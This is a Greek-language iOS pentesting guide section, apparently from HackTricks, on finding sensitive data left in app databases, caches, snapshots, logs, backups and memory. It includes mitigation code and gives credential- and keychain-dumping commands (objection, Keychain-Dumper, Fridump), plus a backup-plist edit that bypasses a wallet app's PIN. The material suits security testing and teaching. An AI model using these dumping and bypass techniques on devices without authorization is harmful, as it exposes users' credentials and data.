Είναι συνηθισμένο για τις εφαρμογές να δημιουργούν τις δικές τους βάσεις δεδομένων sqlite. Μπορεί να **αποθηκεύουν** **ευαίσθητα** **δεδομένα** σε αυτές και να τα αφήνουν μη κρυπτογραφημένα. Επομένως, είναι πάντα ενδιαφέρον να ελέγχετε κάθε βάση δεδομένων μέσα στον κατάλογο των εφαρμογών. Πηγαίνετε στον κατάλογο της εφαρμογής όπου αποθηκεύονται τα δεδομένα (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Βάσεις δεδομένων Firebase Real-Time

Οι προγραμματιστές μπορούν να **αποθηκεύουν και να συγχρονίζουν δεδομένα** μέσα σε μια **βάση δεδομένων που φιλοξενείται στο cloud με NoSQL** μέσω των Βάσεων Δεδομένων Firebase Real-Time. Τα δεδομένα αποθηκεύονται σε μορφή JSON και συγχρονίζονται σε όλους τους συνδεδεμένους πελάτες σε πραγματικό χρόνο.

Μπορείτε να βρείτε πώς να ελέγξετε για λανθασμένα διαμορφωμένες βάσεις δεδομένων Firebase εδώ:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Βάσεις δεδομένων Realm

Το [Realm Objective-C](https://realm.io/docs/objc/latest/) και το [Realm Swift](https://realm.io/docs/swift/latest/) προσφέρουν μια ισχυρή εναλλακτική λύση για την αποθήκευση δεδομένων, η οποία δεν παρέχεται από την Apple. Από προεπιλογή, τα δεδομένα **αποθηκεύονται μη κρυπτογραφημένα**, με την κρυπτογράφηση να είναι διαθέσιμη μέσω συγκεκριμένης διαμόρφωσης.

Οι βάσεις δεδομένων βρίσκονται στο: `/private/var/mobile/Containers/Data/Application/{APPID}`. Για να εξερευνήσετε αυτά τα αρχεία, μπορείτε να χρησιμοποιήσετε εντολές όπως:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Για την προβολή αυτών των αρχείων βάσης δεδομένων, συνιστάται το εργαλείο [**Realm Studio**](https://github.com/realm/realm-studio).

Για την εφαρμογή κρυπτογράφησης μέσα σε μια βάση δεδομένων Realm, μπορεί να χρησιμοποιηθεί το ακόλουθο απόσπασμα κώδικα:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Βάσεις Δεδομένων του Couchbase Lite

Το [Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) περιγράφεται ως έναν **ελαφρύ** και **ενσωματωμένο** μηχανισμό βάσης δεδομένων που ακολουθεί την προσέγγιση **εγγράφου-στρατού** (NoSQL). Σχεδιασμένο να είναι φυσικό στα **iOS** και **macOS**, προσφέρει τη δυνατότητα συγχρονισμού δεδομένων χωρίς διακοπές.

Για να εντοπίσετε πιθανές βάσεις δεδομένων του Couchbase σε μια συσκευή, πρέπει να ελεγχθεί το ακόλουθο φάκελο:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

Το iOS αποθηκεύει τα cookies των εφαρμογών στο **`Library/Cookies/cookies.binarycookies`** μέσα στο φάκελο κάθε εφαρμογής. Ωστόσο, οι προγραμματιστές μερικές φορές αποφασίζουν να τα αποθηκεύσουν στο **keychain** καθώς το ανωτέρω **αρχείο cookie μπορεί να προσπελαστεί σε αντίγραφα ασφαλείας**.

Για να επιθεωρήσετε το αρχείο cookies μπορείτε να χρησιμοποιήσετε [**αυτό το python script**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ή να χρησιμοποιήσετε την εντολή **`ios cookies get`** του objection.\
**Μπορείτε επίσης να χρησιμοποιήσετε το objection για** μετατροπή αυτών των αρχείων σε μορφή JSON και επιθεώρηση των δεδομένων.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Προσωρινή μνήμη

Από προεπιλογή, η NSURLSession αποθηκεύει δεδομένα, όπως **HTTP αιτήσεις και απαντήσεις στη βάση δεδομένων Cache.db**. Αυτή η βάση δεδομένων μπορεί να περιέχει **ευαίσθητα δεδομένα**, όπως τοκεν, ονόματα χρηστών ή οποιεσδήποτε άλλες ευαίσθητες πληροφορίες που έχουν αποθηκευτεί. Για να βρείτε τις αποθηκευμένες πληροφορίες, ανοίξτε τον κατάλογο δεδομένων της εφαρμογής (`/var/mobile/Containers/Data/Application/<UUID>`) και πηγαίνετε στο `/Library/Caches/<Bundle Identifier>`. Η **προσωρινή μνήμη του WebKit αποθηκεύεται επίσης στο αρχείο Cache.db**. Το **Objection** μπορεί να ανοίξει και να αλληλεπιδράσει με τη βάση δεδομένων με την εντολή `sqlite connect Cache.db`, καθώς πρόκειται για μια **κανονική βάση δεδομένων SQLite**.

Συνιστάται να **απενεργοποιήσετε την αποθήκευση αυτών των δεδομένων**, καθώς μπορεί να περιέχουν ευαίσθητες πληροφορίες στο αίτημα ή την απάντηση. Η παρακάτω λίστα δείχνει διαφορετικούς τρόπους επίτευξης αυτού:

1. Συνιστάται να αφαιρέσετε τις αποθηκευμένες απαντήσεις μετά την αποσύνδεση. Αυτό μπορεί να γίνει με τη μέθοδο που παρέχεται από την Apple με το όνομα [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) Μπορείτε να καλέσετε αυτή τη μέθοδο ως εξής:

`URLCache.shared.removeAllCachedResponses()`

Αυτή η μέθοδος θα αφαιρέσει όλα τα αποθηκευμένα αιτήματα και απαντήσεις από το αρχείο Cache.db.
2. Αν δεν χρειάζεστε να χρησιμοποιήσετε τα cookies, θα ήταν συνιστώμενο να χρησιμοποιήσετε απλώς την ιδιότητα [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) της URLSession, η οποία θα απενεργοποιήσει την αποθήκευση cookies και προσωρινής μνήμης.

[Τεκμηρίωση Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Ένα αντικείμενο διαμόρφωσης συνεδρίας ephemeral είναι παρόμοιο με ένα προεπιλεγμένο αντικείμενο διαμόρφωσης συνεδρίας (δείτε default), εκτός από το γεγονός ότι το αντίστοιχο αντικείμενο συνεδρίας δεν αποθηκεύει caches, αποθηκεύει διαπιστευτήρια ή οποιαδήποτε δεδομένα που σχετίζονται με τη συνεδρία στο δίσκο. Αντ' αυτού, τα δεδομένα που σχετίζονται με τη συνεδρία αποθηκεύονται στη RAM. Η μόνη φορά που μια εφήμερη συνεδρία γράφει δεδομένα στο δίσκο είναι όταν της λέτε να γράψει τα περιεχόμενα ενός URL σε ένα αρχείο.`
3. Η προσωρινή μνήμη μπορεί επίσης να απενεργοποιηθεί με την ρύθμιση της πολιτικής Cache σε [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Αυτό θα απενεργοποιήσει την αποθήκευση της προσωρινής μνήμης με οποιονδήποτε τρόπο, είτε στη μνήμη είτε στον δίσκο.

### Στιγμιότυπα

Κάθε φορά που πατάτε το κουμπί αρχικής οθόνης, το iOS **παίρνει ένα στιγμιότυπο της τρέχουσας οθόνης** για να μπορεί να γίνει η μετάβαση στην εφαρμογή με πιο ομαλό τρόπο. Ωστόσο, αν **ευαίσθητα δεδομένα** υπάρχουν στην τρέχουσα οθόνη, θα **αποθηκευτούν** στην **εικόνα** (η οποία **διατηρείται** **ακόμα και μετά** **την** **επανεκκίνηση**). Αυτά είναι τα στιγμιότυπα στα οποία μπορείτε επίσης να έχετε πρόσβαση πατώντας δύο φορές την αρχική οθόνη για να μεταβείτε μεταξύ εφαρμογών.

Εκτός αν το iPhone έχει κάνει jailbreak, ο **επιτιθέμενος** χρειάζεται να έχει **πρόσβαση** στη **συσκευή** **ξεκλειδωμένη** για να δει αυτά τα στιγμιότυπα. Από προεπιλογή, το τελευταίο στιγμιότυπο αποθηκεύεται στο sandbox της εφαρμογής στον κατάλογο `Library/Caches/Snapshots/` ή `Library/SplashBoard/Snapshots` (τα αξιόπιστα υπολογιστές δεν μπορούν να έχουν πρόσβαση στο σύστημα αρχείων από το iOX 7.0).

Ένας τρόπος να αποτρέψετε αυτήν την κακή συμπεριφορά είναι να βάλετε μια κενή οθόνη ή να αφαιρέσετε τα ευαίσθητα δεδομένα πριν πάρετε το στιγμιότυπο χρησιμοποιώντας τη συνάρτηση `ApplicationDidEnterBackground()`.

Το παρακάτω είναι ένα δείγμα μεθόδου αντιμετώπισης που θα ορίσει ένα προεπιλεγμένο στιγμιότυπο.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
**Στόχος-C:**
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Αυτό ορίζει την εικόνα φόντου σε `overlayImage.png` όταν η εφαρμογή μεταβαίνει στο παρασκήνιο. Αυτό εμποδίζει τη διαρροή ευαίσθητων δεδομένων επειδή το `overlayImage.png` θα αντικαθιστά πάντα την τρέχουσα προβολή.

### Keychain

Για την πρόσβαση και διαχείριση του keychain του iOS, υπάρχουν εργαλεία όπως το [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper), κατάλληλα για συσκευές με jailbreak. Επιπλέον, το [**Objection**](https://github.com/sensepost/objection) παρέχει την εντολή `ios keychain dump` για παρόμοιους σκοπούς.

#### **Αποθήκευση Διαπιστευτηρίων**

Η κλάση **NSURLCredential** είναι ιδανική για την αποθήκευση ευαίσθητων πληροφοριών απευθείας στο keychain, παρακάμπτοντας την ανάγκη για NSUserDefaults ή άλλες επικαλύψεις. Για την αποθήκευση διαπιστευτηρίων μετά τη σύνδεση, χρησιμοποιείται ο παρακάτω κώδικας σε Swift:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Για να εξάγουμε αυτές τις αποθηκευμένες διαπιστευτήριες, χρησιμοποιείται η εντολή `ios nsurlcredentialstorage dump` του Objection.

## **Προσαρμοσμένα Πληκτρολόγια και Προσωρινή Μνήμη Πληκτρολογίου**

Από το iOS 8.0 και μετά, οι χρήστες μπορούν να εγκαταστήσουν επεκτάσεις προσαρμοσμένου πληκτρολογίου, τα οποία διαχειρίζονται στο **Ρυθμίσεις > Γενικές > Πληκτρολόγιο > Πληκτρολόγια**. Αν και αυτά τα πληκτρολόγια προσφέρουν επιπλέον λειτουργικότητα, αποτελούν κίνδυνο για καταγραφή πληκτρολογίου και μετάδοση δεδομένων σε εξωτερικούς διακομιστές, αν και οι χρήστες ενημερώνονται για τα πληκτρολόγια που απαιτούν πρόσβαση στο δίκτυο. Οι εφαρμογές μπορούν, και πρέπει, να περιορίσουν τη χρήση προσαρμοσμένων πληκτρολογίων για την εισαγωγή ευαίσθητων πληροφοριών.

**Συστάσεις Ασφαλείας:**

* Συνιστάται η απενεργοποίηση των πληκτρολογίων τρίτων για ενισχυμένη ασφάλεια.
* Να ληφθεί υπόψη η λειτουργία αυτόματης διόρθωσης και αυτόματων προτάσεων του προεπιλεγμένου πληκτρολογίου του iOS, το οποίο μπορεί να αποθηκεύει ευαίσθητες πληροφορίες σε αρχεία προσωρινής μνήμης που βρίσκονται στο `Library/Keyboard/{locale}-dynamic-text.dat` ή `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Αυτά τα αρχεία προσωρινής μνήμης πρέπει να ελέγχονται τακτικά για ευαίσθητα δεδομένα. Συνιστάται η επαναφορά του λεξικού πληκτρολογίου μέσω των **Ρυθμίσεις > Γενικές > Επαναφορά > Επαναφορά Λεξικού Πληκτρολογίου** για την εκκαθάριση των δεδομένων προσωρινής μνήμης.
* Η παρεμβολή στην κίνηση δικτύου μπορεί να αποκαλύψει εάν ένα προσαρμοσμένο πληκτρολόγιο μεταδίδει απομακρυσμένα πληκτρολογήματα.

### **Αποτροπή Προσωρινής Αποθήκευσης Πεδίων Κειμένου**

Το πρωτόκολλο [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) προσφέρει ιδιότητες για τη διαχείριση της αυτόματης διόρθωσης και της ασφαλούς εισαγωγής κειμένου, τα οποία είναι ουσιώδη για την αποτροπή της προσωρινής αποθήκευσης ευαίσθητων πληροφοριών. Για παράδειγμα, η απενεργοποίηση της αυτόματης διόρθωσης και η ενεργοποίηση της ασφαλούς εισαγωγής κειμένου μπορεί να επιτευχθεί με:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Επιπλέον, οι προγραμματιστές θα πρέπει να διασφαλίζουν ότι τα πεδία κειμένου, ειδικά αυτά που προορίζονται για την εισαγωγή ευαίσθητων πληροφοριών όπως κωδικοί πρόσβασης και PIN, απενεργοποιούν τη μνήμη cache με την ρύθμιση `autocorrectionType` σε `UITextAutocorrectionTypeNo` και `secureTextEntry` σε `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Αρχεία καταγραφής (Logs)**

Η αποσφαλμάτωση κώδικα συχνά περιλαμβάνει τη χρήση **καταγραφής (logging)**. Υπάρχει κίνδυνος καθώς τα **logs μπορεί να περιέχουν ευαίσθητες πληροφορίες**. Παλαιότερα, στο iOS 6 και σε προηγούμενες εκδόσεις, τα logs ήταν προσβάσιμα από όλες τις εφαρμογές, δημιουργώντας κίνδυνο διαρροής ευαίσθητων δεδομένων. **Τώρα, οι εφαρμογές περιορίζονται στην πρόσβαση μόνο στα δικά τους logs**.

Παρά τους περιορισμούς αυτούς, ένας **εισβολέας με φυσική πρόσβαση** σε ένα ξεκλείδωτο συσκευή μπορεί ακόμα να εκμεταλλευτεί αυτό συνδέοντας τη συσκευή σε έναν υπολογιστή και **διαβάζοντας τα logs**. Είναι σημαντικό να σημειωθεί ότι τα logs παραμένουν στο δίσκο ακόμα και μετά την απεγκατάσταση της εφαρμογής.

Για τη μείωση των κινδύνων, συνιστάται να **αλληλεπιδράσετε ενδελεχώς με την εφαρμογή**, εξερευνώντας όλες τις λειτουργίες και τις εισόδους της για να διασφαλίσετε ότι δεν καταγράφονται κατά λάθος ευαίσθητες πληροφορίες.

Κατά την αναθεώρηση του πηγαίου κώδικα της εφαρμογής για πιθανές διαρροές, αναζητήστε τόσο **προκαθορισμένες** όσο και **προσαρμοσμένες δηλώσεις καταγραφής** χρησιμοποιώντας λέξεις-κλειδιά όπως `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` για ενσωματωμένες λειτουργίες, καθώς και οποιαδήποτε αναφορά σε `Logging` ή `Logfile` για προσαρμοσμένες υλοποιήσεις.

### **Παρακολούθηση των Logs του Συστήματος**

Οι εφαρμογές καταγράφουν διάφορα κομμάτια πληροφοριών τα οποία μπορεί να είναι ευαίσθητα. Για την παρακολούθηση αυτών των logs, εργαλεία και εντολές όπως:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
Είναι χρήσιμα. Επιπλέον, το **Xcode** παρέχει έναν τρόπο για τη συλλογή καταγραφικών αρχείων κονσόλας:

1. Ανοίξτε το Xcode.
2. Συνδέστε τη συσκευή iOS.
3. Πλοηγηθείτε σε **Παράθυρο** -> **Συσκευές και Προσομοιωτές**.
4. Επιλέξτε τη συσκευή σας.
5. Προκαλέστε το πρόβλημα που ερευνάτε.
6. Χρησιμοποιήστε το κουμπί **Άνοιγμα Κονσόλας** για να δείτε τα αρχεία καταγραφής σε ένα νέο παράθυρο.

Για πιο προηγμένη καταγραφή, η σύνδεση στο κέλυφος της συσκευής και η χρήση του **socat** μπορεί να παρέχει παρακολούθηση καταγραφής σε πραγματικό χρόνο:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Ακολουθούν εντολές για παρακολούθηση δραστηριοτήτων καταγραφής, οι οποίες μπορεί να είναι ανεκτίμητες για τη διάγνωση προβλημάτων ή την αναγνώριση πιθανών διαρροών δεδομένων στα logs.

***

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) για εύκολη δημιουργία και **αυτοματοποίηση ροών εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Αντίγραφα Ασφαλείας

Οι **λειτουργίες αυτόματης δημιουργίας αντιγράφων ασφαλείας** ενσωματώνονται στο iOS, διευκολύνοντας τη δημιουργία αντιγράφων δεδομένων συσκευής μέσω του iTunes (μέχρι το macOS Catalina), του Finder (από το macOS Catalina και μετά) ή του iCloud. Αυτά τα αντίγραφα ασφαλείας περιλαμβάνουν σχεδόν όλα τα δεδομένα της συσκευής, εξαιρουμένων υψηλά ευαίσθητων στοιχείων όπως λεπτομέρειες του Apple Pay και ρυθμίσεις του Touch ID.

### Κίνδυνοι Ασφάλειας

Η περιλαμβανόμενη **εγκατάσταση εφαρμογών και των δεδομένων τους** στα αντίγραφα ασφαλείας θέτει το ζήτημα της πιθανής **διαρροής δεδομένων** και του κινδύνου ότι **οι τροποποιήσεις στα αντίγραφα ασφαλείας μπορεί να αλλάξουν τη λειτουργικότητα της εφαρμογής**. Συνιστάται να **μην αποθηκεύετε ευαίσθητες πληροφορίες σε καθαρό κείμενο** μέσα στον κατάλογο οποιασδήποτε εφαρμογής ή των υποκαταλόγων της για τη μείωση αυτών των κινδύνων.

### Αποκλεισμός Αρχείων από τα Αντίγραφα Ασφαλείας

Τα αρχεία στα `Documents/` και `Library/Application Support/` αντιγράφονται από προεπιλογή. Οι προγραμματιστές μπορούν να αποκλείσουν συγκεκριμένα αρχεία ή καταλόγους από τα αντίγραφα ασφαλείας χρησιμοποιώντας το `NSURL setResourceValue:forKey:error:` με το `NSURLIsExcludedFromBackupKey`. Αυτή η πρακτική είναι ζωτική για την προστασία ευαίσθητων δεδομένων από το να συμπεριληφθούν σε αντίγραφα ασφαλείας.

### Δοκιμή για Ευπάθειες

Για να αξιολογήσετε την ασφάλεια του αντιγράφου ασφαλείας μιας εφαρμογής, ξεκινήστε με το **δημιουργία ενός αντιγράφου ασφαλείας** χρησιμοποιώντας το Finder, στη συνέχεια εντοπίστε το χρησιμοποιώντας τις οδηγίες από την [επίσημη τεκμηρίωση της Apple](https://support.apple.com/en-us/HT204215). Αναλύστε το αντίγραφο ασφαλείας για ευαίσθητα δεδομένα ή ρυθμίσεις που θα μπορούσαν να τροποποιηθούν για να επηρεάσουν τη συμπεριφορά της εφαρμογής.

Ευαίσθητες πληροφορίες μπορούν να αναζητηθούν χρησιμοποιώντας εργαλεία γραμμής εντολών ή εφαρμογές όπως το [iMazing](https://imazing.com). Για κρυπτογραφημένα αντίγραφα ασφαλείας, η ύπαρξη κρυπτογράφησης μπορεί να επιβεβαιωθεί ελέγχοντας το κλειδί "IsEncrypted" στο αρχείο "Manifest.plist" στη ρίζα του αντιγράφου ασφαλείας.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
### Τροποποίηση συμπεριφοράς εφαρμογής

Ένα παράδειγμα τροποποίησης της συμπεριφοράς μιας εφαρμογής μέσω τροποποιήσεων στο αντίγραφο ασφαλείας παρουσιάζεται στην εφαρμογή πορτοφόλι Bitcoin [Bither](https://github.com/bither/bither-ios), όπου το PIN κλειδώματος του UI αποθηκεύεται μέσα στο `net.bither.plist` υπό το κλειδί **pin\_code**. Αφαίρεση αυτού του κλειδιού από το plist και επαναφορά του αντιγράφου ασφαλείας καταργεί την απαίτηση του PIN, παρέχοντας απεριόριστη πρόσβαση.

## Σύνοψη για τον Έλεγχο Μνήμης για Ευαίσθητα Δεδομένα

Όταν ασχολείστε με ευαίσθητες πληροφορίες που αποθηκεύονται στη μνήμη μιας εφαρμογής, είναι κρίσιμο να περιορίσετε τον χρόνο έκθεσης αυτών των δεδομένων. Υπάρχουν δύο κύριες προσεγγίσεις για να εξετάσετε το περιεχόμενο της μνήμης: **δημιουργία εκχύλισης μνήμης** και **ανάλυση της μνήμης εν χρόνω πραγματικό**. Και οι δύο μέθοδοι έχουν τις προκλήσεις τους, συμπεριλαμβανομένης της πιθανότητας να χάσετε κρίσιμα δεδομένα κατά τη διαδικασία εκχύλισης ή ανάλυσης.

## **Ανάκτηση και Ανάλυση Εκχύλισης Μνήμης**

Για τόσο jailbroken όσο και μη-jailbroken συσκευές, εργαλεία όπως το [objection](https://github.com/sensepost/objection) και το [Fridump](https://github.com/Nightbringer21/fridump) επιτρέπουν την εκχύλιση της μνήμης διεργασίας μιας εφαρμογής. Μετά την εκχύλιση, η ανάλυση αυτών των δεδομένων απαιτεί διάφορα εργαλεία, ανάλογα με τη φύση των πληροφοριών που αναζητάτε.

Για την εξαγωγή συμβολοσειρών από μια εκχύλιση μνήμης, μπορούν να χρησιμοποιηθούν εντολές όπως `strings` ή `rabin2 -zz`:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Για πιο λεπτομερή ανάλυση, συμπεριλαμβανομένης της αναζήτησης συγκεκριμένων τύπων δεδομένων ή προτύπων, το **radare2** προσφέρει εκτεταμένες δυνατότητες αναζήτησης:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Ανάλυση Μνήμης Εκτέλεσης**

Το **r2frida** παρέχει μια ισχυρή εναλλακτική λύση για την επιθεώρηση της μνήμης μιας εφαρμογής σε πραγματικό χρόνο, χωρίς την ανάγκη για αντιγραφή μνήμης. Αυτό το εργαλείο επιτρέπει την εκτέλεση εντολών αναζήτησης απευθείας στη μνήμη της εφαρμογής που εκτελείται:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Σπασμένη Κρυπτογραφία

### Ανεπαρκής Διαχείριση Κλειδιών

Ορισμένοι προγραμματιστές αποθηκεύουν ευαίσθητα δεδομένα στην τοπική αποθήκευση και τα κρυπτογραφούν με ένα κλειδί που είναι σκληροπροσδιορίσιμο στον κώδικα. Αυτό δεν πρέπει να γίνεται, καθώς μερικές αναστροφές μπορεί να επιτρέψουν σε επιτιθέμενους να εξάγουν τις εμπιστευτικές πληροφορίες.

### Χρήση Μη Ασφαλών και/ή Απαρχαιωμένων Αλγορίθμων

Οι προγραμματιστές δεν πρέπει να χρησιμοποιούν **απαρχαιωμένους αλγορίθμους** για την εκτέλεση ελέγχων **εξουσιοδότησης**, **αποθήκευσης** ή **αποστολής** δεδομένων. Μερικοί από αυτούς τους αλγορίθμους είναι: RC4, MD4, MD5, SHA1... Εάν οι **κατακερματισμοί** χρησιμοποιούνται για την αποθήκευση κωδικών πρόσβασης, θα πρέπει να χρησιμοποιούνται κατακερματισμοί ανθεκτικοί στη βία με αλάτι.

### Έλεγχος

Οι κύριοι έλεγχοι που πρέπει να πραγματοποιηθούν είναι να ελεγχθεί αν μπορείτε να βρείτε **σκληροπροσδιορισμένους** κωδικούς/μυστικά στον κώδικα, ή αν αυτοί είναι **προβλέψιμοι**, και αν ο κώδικας χρησιμοποιεί κάποιο είδος **αδύναμων** **κρυπτογραφικών** αλγορίθμων.

Είναι ενδιαφέρον να γνωρίζετε ότι μπορείτε να **παρακολουθείτε** ορισμένες **κρυπτογραφικές** **βιβλιοθήκες** αυτόματα χρησιμοποιώντας το **objection** με:
```swift
ios monitor crypt
```
Για **περισσότερες πληροφορίες** σχετικά με τις κρυπτογραφικές APIs και βιβλιοθήκες του iOS, επισκεφθείτε το [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Τοπική Ταυτοποίηση

Η **τοπική ταυτοποίηση** διαδραματίζει κρίσιμο ρόλο, ειδικά όταν πρόκειται για την προστασία της πρόσβασης σε ένα απομακρυσμένο σημείο μέσω κρυπτογραφικών μεθόδων. Η ουσία εδώ είναι ότι χωρίς τη σωστή υλοποίηση, οι μηχανισμοί τοπικής ταυτοποίησης μπορούν να παρακαμφθούν.

Το [**πλαίσιο τοπικής ταυτοποίησης**](https://developer.apple.com/documentation/localauthentication) της Apple και το [**keychain**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) παρέχουν αξιόπιστες APIs στους προγραμματιστές για τη διευκόλυνση των διαλόγων ταυτοποίησης χρήστη και την ασφαλή χειρισμό μυστικών δεδομένων αντίστοιχα. Το Secure Enclave ασφαλίζει το αναγνωριστικό δακτυλικών αποτυπωμάτων για το Touch ID, ενώ το Face ID βασίζεται στην αναγνώριση προσώπου χωρίς να θέτει σε κίνδυνο τα βιομετρικά δεδομένα.

Για να ενσωματώσουν το Touch ID/Face ID, οι προγραμματιστές έχουν δύο επιλογές API:

* **`LocalAuthentication.framework`** για υψηλού επιπέδου ταυτοποίηση χρήστη χωρίς πρόσβαση σε βιομετρικά δεδομένα.
* **`Security.framework`** για πρόσβαση σε υπηρεσίες χαμηλότερου επιπέδου στο keychain, ασφαλίζοντας μυστικά δεδομένα με βιομετρική ταυτοποίηση. Διάφορα [περιτυλίγματα ανοιχτού κώδικα](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) κάνουν την πρόσβαση στο keychain πιο απλή.

{% hint style="danger" %}
Ωστόσο, τόσο το `LocalAuthentication.framework` όσο και το `Security.framework` παρουσιάζουν ευπάθειες, καθώς κυρίως επιστρέφουν λογικές τιμές χωρίς να μεταδίδουν δεδομένα για τις διαδικασίες ταυτοποίησης, κάτι που τα καθιστά ευάλωτα στην παράκαμψη (αναφερθείτε στο [Μην με αγγίζεις έτσι, από τον David Lindner κ.ά.](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Εφαρμογή Τοπικής Ταυτοποίησης

Για να ζητήσουν από τους χρήστες ταυτοποίηση, οι προγραμματιστές πρέπει να χρησιμοποιήσουν τη μέθοδο **`evaluatePolicy`** μέσα στην κλάση **`LAContext`**, επιλέγοντας μεταξύ:

* **`deviceOwnerAuthentication`**: Ζητά το Touch ID ή τον κωδικό πρόσβασης της συσκευής, αποτυγχάνοντας εάν κανένα από τα δύο δεν είναι ενεργοποιημένο.
* **`deviceOwnerAuthenticationWithBiometrics`**: Ζητά αποκλειστικά το Touch ID.

Μια επιτυχημένη ταυτοποίηση υποδεικνύεται από μια λογική τιμή επιστροφής από το **`evaluatePolicy`**, επισημαίνοντας ένα πιθανό ελάττωμα ασφάλειας.

### Τοπική Ταυτοποίηση με Χρήση Keychain

Η εφαρμογή **τοπικής ταυτοποίησης** σε εφαρμογές iOS περιλαμβάνει τη χρήση των **keychain APIs** για την ασφαλή αποθήκευση μυστικών δεδομένων όπως διαπιστευτήρια πιστοποίησης. Αυτή η διαδικασία εξασφαλίζει ότι τα δεδομένα μπορούν να προσπελαστούν μόνο από τον χρήστη, χρησιμοποιώντας τον κωδικό πρόσβασης της συσκευής του ή τη βιομετρική ταυτοποίηση όπως το Touch ID.

Το keychain προσφέρει τη δυνατότητα να ορίσετε στοιχεία με το χαρακτηριστικό `SecAccessControl`, το οποίο περιορίζει την πρόσβαση στο στοιχείο μέχρι ο χρήστης να ταυτοποιηθεί με επιτυχία μέσω του Touch ID ή του κωδικού πρόσβασης της συσκευής. Αυτό το χαρακτηριστικό είναι κρίσιμο για τη βελτίωση της ασφάλειας.

